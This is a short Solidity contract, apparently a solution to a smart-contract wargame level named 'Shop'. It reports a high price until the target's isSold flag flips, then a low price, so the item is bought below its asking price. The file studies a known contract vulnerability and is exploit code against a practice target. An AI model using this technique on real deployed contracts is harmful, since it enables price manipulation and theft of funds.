// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../interfaces/shop.sol";

/**
 * this contract will use the change of the target contract state variable isSold 
 * in order return a different price the second time the function price() is called
 */
contract shopAttack {

    // address payable public target;
    Shop public immutable target;
    constructor(address payable targetAddress) {
      target = Shop(targetAddress);
    }

  function attack() external {
    target.buy();
  }

  function price() external view returns (uint) {
      if(target.isSold() == true) {
      return 1;
      }
    return 101;
  }

}
